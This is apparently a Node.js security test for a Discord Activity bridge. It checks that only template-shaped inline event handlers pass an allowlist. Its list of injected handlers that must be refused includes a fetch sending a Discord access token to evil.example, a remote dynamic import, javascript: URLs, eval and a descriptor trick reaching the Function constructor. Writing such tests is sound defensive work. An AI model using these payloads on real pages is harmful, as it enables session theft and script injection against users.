/**
 * R-04 of the findings report: the Discord Activity bridge compiles only inline handlers whose
 * shape one of our templates produces (activity/handler-shapes.js, activity/build.js). Needs no
 * server:
 *
 *   node tests/security/activity-handlers.test.js
 *
 * 1. The build finds the handlers of mp.js and client/ and none of them is a whole ${…}.
 * 2. Every handler, rendered with sample values (strings, numbers, -1, null), is allowed.
 * 3. Injected handlers – fetch, alert, a call appended to a real handler, the descriptor trick –
 *    do not.
 * 4. The bundle carries the list.
 */
const fs = require('fs');
const path = require('path');
const { execFileSync } = require('child_process');
const { PLACEHOLDER, shapeOf, allowed } = require('../../activity/handler-shapes');
const build = require('../../activity/build');

let failed = 0;
const ok = (cond, name, info) => {
    console.log(`${cond ? 'PASS' : 'FAIL'}  ${name}${info ? '  (' + info + ')' : ''}`);
    if (!cond) failed++;
};

const table = build.collectShapes();
const fits = code => allowed(code, table);
ok(Object.keys(table).length > 50, 'the build collects the handler shapes of mp.js and client/', String(Object.keys(table).length));
ok(fits('MP.host()') && fits('MP.browseMaps(); return false') && fits("ASYNC.browseMaps(); return false") && fits("deleteToken('totp', 'abc-1')") && fits("deleteToken('email', null)"),
    'the formerly dynamic handlers (mph-mode buttons, browseLink, MFA delete) have fixed shapes');

// every source handler, rendered with sample values
const ROOT = path.join(__dirname, '..', '..');
const files = [path.join(ROOT, 'mp.js')];
const walk = p => fs.statSync(p).isDirectory() ? fs.readdirSync(p).forEach(f => walk(path.join(p, f))) : p.endsWith('.js') && files.push(p);
walk(path.join(ROOT, 'client'));
const refused = [];
let count = 0;
for (const f of files) {
    for (const h of build.handlersIn(fs.readFileSync(f, 'utf8'))) {
        for (const sample of ['abc', '7', '-1', 'null', "'AB12'"]) {
            // inside a quoted string the value stays text; outside it is a number, null or a quoted id
            const rendered = h.code.split(PLACEHOLDER).join(sample);
            count++;
            if (!fits(rendered) && !/abc|'AB12'/.test(sample)) refused.push(`${path.relative(ROOT, f)}:${h.line} ${rendered}`);
        }
    }
}
ok(refused.length === 0, `all ${count} rendered sample handlers are allowed`, refused.slice(0, 5).join(' | '));

const attacks = [
    "location.href='javascript:alert(1)'",
    "fetch('//evil.example/?t='+sessionStorage.getItem('discord_access_token'))",
    'alert(1)',
    'alert`1`',
    "MP.join('x');alert(1)",
    "MP.join('x'),alert(1)",
    "MP.host(alert(1))",
    'this.remove();fetch(1)',
    "Object.values(Object.getOwnPropertyDescriptors(Object.getPrototypeOf(alert))).at(3).value('alert(1)')()",
    'eval(name)',
    "location='javascript:alert(1)'",
    "import('//evil.example/x.js')",
];
for (const a of attacks) ok(!fits(a), 'refused: ' + a, shapeOf(a));
// literals written into a template are pinned: same shape, other text
ok(fits("location.href='/client/admin.html'") && !fits("location.href='javascript:alert(1)'"), 'a fixed address stays fixed (no javascript: URL)');
ok(fits("if (event.key === 'Enter') PRESETS.save('live'); if (event.key === 'Escape') PRESETS.cancel('live')")
    && !fits("if (event.key === 'Enter') PRESETS.save('live'); if (event.key === 'x') PRESETS.cancel('live')"), 'only the ${…} positions take any literal');
ok(shapeOf("MP.join('a\\'b')") === shapeOf("MP.join('x')"), 'an escaped quote inside a string stays one literal');
ok(shapeOf('MP.f(-1)') === shapeOf('MP.f(1)') && shapeOf('a-1') !== shapeOf('a 1'), 'a negative number is one literal, a subtraction is not');

// the bundle carries the list
execFileSync(process.execPath, [path.join(ROOT, 'activity', 'build.js')], { stdio: 'pipe' });
const bundle = fs.readFileSync(build.OUT_FILE, 'utf8');
ok(bundle.includes('MP . host ( )') && bundle.includes('/client/admin.html') && !bundle.includes('__HANDLER_SHAPES__'), 'the bundle contains the allowed handlers');

console.log(failed ? `\n${failed} failed` : '\nall passed');
process.exit(failed ? 1 : 0);
